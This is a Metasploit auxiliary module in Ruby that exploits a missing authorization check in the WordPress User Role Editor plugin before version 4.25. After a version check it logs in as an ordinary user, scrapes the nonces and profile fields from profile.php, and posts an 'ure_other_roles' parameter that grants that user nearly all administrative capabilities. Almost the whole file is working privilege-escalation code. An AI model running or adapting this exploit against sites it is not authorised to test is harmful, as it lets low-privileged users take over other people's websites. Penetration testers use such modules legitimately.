##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Wordpress

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress User Role Editor Plugin Privilege Escalation',
      'Description'     => %q{
        The WordPress User Role Editor plugin prior to v4.25, is lacking an authorization
        check within its update user profile functionality ("update" function, contained
        within the "class-user-other-roles.php" module).
        Instead of verifying whether the current user has the right to edit other users'
        profiles ("edit_users" WP capability), the vulnerable function verifies whether the
        current user has the rights to edit the user ("edit_user" WP function) specified by
        the supplied user id ("user_id" variable/HTTP POST parameter). Since the supplied
        user id is the current user's id, this check is always bypassed (i.e. the current
        user is always allowed to modify its profile).
        This vulnerability allows an authenticated user to add arbitrary User Role Editor
        roles to its profile, by specifying them via the "ure_other_roles" parameter within
        the HTTP POST request to the "profile.php" module (issued when "Update Profile" is
        clicked).
        By default, this module grants the specified WP user all administrative privileges,
        existing within the context of the User Role Editor plugin.
      },
      'Author'          =>
        [
          'ethicalhack3r',    # Vulnerability discovery
          'Tomislav Paskalev' # Exploit development, metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['WPVDB', '8432'],
          ['URL', 'https://www.wordfence.com/blog/2016/04/user-role-editor-vulnerability/']
	],
      'DisclosureDate'  => 'Apr 05 2016',
    ))

    register_options(
      [
        OptString.new('TARGETURI',   [true, 'URI path to WordPress', '/']),
        OptString.new('ADMINPATH',   [true, 'wp-admin directory', 'wp-admin/']),
        OptString.new('CONTENTPATH', [true, 'wp-content directory', 'wp-content/']),
        OptString.new('PLUGINSPATH', [true, 'wp plugins directory', 'plugins/']),
        OptString.new('PLUGINPATH',  [true, 'User Role Editor directory', 'user-role-editor/']),
        OptString.new('USERNAME',    [true, 'WordPress username']),
        OptString.new('PASSWORD',    [true, 'WordPress password']),
	OptString.new('PRIVILEGES',  [true, 'Desired User Role Editor privileges', 'activate_plugins,delete_others_pages,delete_others_posts,delete_pages,delete_posts,delete_private_pages,delete_private_posts,delete_published_pages,delete_published_posts,edit_dashboard,edit_others_pages,edit_others_posts,edit_pages,edit_posts,edit_private_pages,edit_private_posts,edit_published_pages,edit_published_posts,edit_theme_options,export,import,list_users,manage_categories,manage_links,manage_options,moderate_comments,promote_users,publish_pages,publish_posts,read_private_pages,read_private_posts,read,remove_users,switch_themes,upload_files,customize,delete_site,create_users,delete_plugins,delete_themes,delete_users,edit_plugins,edit_themes,edit_users,install_plugins,install_themes,unfiltered_html,unfiltered_upload,update_core,update_plugins,update_themes,ure_create_capabilities,ure_create_roles,ure_delete_capabilities,ure_delete_roles,ure_edit_roles,ure_manage_options,ure_reset_roles'])
      ])
  end

  # Detect the vulnerable plugin by enumerating its readme.txt file
  def check
    readmes = ['readme.txt', 'Readme.txt', 'README.txt']

    res = nil
    readmes.each do |readme_name|
      readme_url = normalize_uri(target_uri.path, datastore['CONTENTPATH'], datastore['PLUGINSPATH'], datastore['PLUGINPATH'], readme_name)
      vprint_status("Checking #{readme_url}")
      res = send_request_cgi(
        'uri'    => readme_url,
        'method' => 'GET'
      )
      break if res && res.code == 200
    end

    if res.nil? || res.code != 200
      # The readme.txt file does not exist
      return Msf::Exploit::CheckCode::Unknown
    end

    version_res = extract_and_check_version(res.body.to_s, :readme, 'plugin', '4.25', nil)
    return version_res
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  # Search for specified data within the provided HTTP response
  def check_response(res, name, regex)
    res.body =~ regex
    result = $1
    if result
      print_good("#{peer} - WordPress - Getting data   - #{name}")
    else
      vprint_error("#{peer} #{res.body}")
      fail_with("#{peer} - WordPress - Getting data   - Failed (#{name})")
    end
    return result
  end

  # Run the exploit
  def run
    # Check if the specified target is running WordPress
    fail_with("#{peer} - WordPress - Not Found") unless wordpress_and_online?

    # Authenticate to WordPress
    print_status("#{peer} - WordPress - Authentication - #{username}:#{password}")
    cookie = wordpress_login(username, password)
    fail_with("#{peer} - WordPress - Authentication - Failed") if cookie.nil?
    store_valid_credential(user: username, private: password, proof: cookie)
    print_good("#{peer} - WordPress - Authentication - OK")

    # Get additional information from WordPress, required for the HTTP POST request (anti-CSRF tokens, user parameters)
    url = normalize_uri(wordpress_url_backend, 'profile.php')
    print_status("#{peer} - WordPress - Getting data   - #{url}")
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => url,
      'cookie'   => cookie
    })

    if res and res.code == 200
      wp_nonce     = check_response(res, "_wpnonce",     /name=\"_wpnonce\" value=\"(.+?(?=\"))\"/)
      color_nonce  = check_response(res, "color-nonce",  /name=\"color-nonce\" value=\"(.+?(?=\"))\"/)
      checkuser_id = check_response(res, "checkuser_id", /name=\"checkuser_id\" value=\"(.+?(?=\"))\"/)
      nickname     = check_response(res, "nickname",     /name=\"nickname\" id=\"nickname\" value=\"(.+?(?=\"))\"/)
      display_name = check_response(res, "display_name", /name=\"display_name\" id=\"display_name\"\>[\s]+\<option  selected=\'selected\'\>(.+?(?=\<))\</)
      email        = check_response(res, "email",        /name=\"email\" id=\"email\" value=\"(.+?(?=\"))\"/)
      user_id      = check_response(res, "user_id",      /name=\"user_id\" id=\"user_id\" value=\"(.+?(?=\"))\"/)
    else
      fail_with("#{peer} - WordPress - Getting data   - Server response (code #{res.code})")
    end

    # Send HTTP POST request - update the specified user's privileges
    print_status("#{peer} - WordPress - Changing privs - #{username}")
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => url,
      'vars_post' => {
        '_wpnonce'         => wp_nonce,
        '_wp_http_referer' => URI::encode(url),
        'from'             => 'profile',
        'checkuser_id'     => checkuser_id,
        'color-nonce'      => color_nonce,
        'admin_color'      => 'fresh',
        'admin_bar_front'  => '1',
        'first_name'       => '',
        'last_name'        => '',
        'nickname'         => nickname,
        'display_name'     => display_name,
        'email'            => email,
        'url'              => '',
        'description'      => '',
        'pass1'            => '',
        'pass2'            => '',
        'ure_other_roles'  => datastore['PRIVILEGES'],
        'action'           => 'update',
        'user_id'          => user_id,
        'submit'           => 'Update+Profile'
      },
      'cookie'    => cookie
    })

    # check outcome
    if res and res.code == 302
      print_good("#{peer} - WordPress - Changing privs - OK")
    else
      fail_with("#{peer} - WordPress - Changing privs - Server response (code #{res.code})")
    end
  end
end

# EoF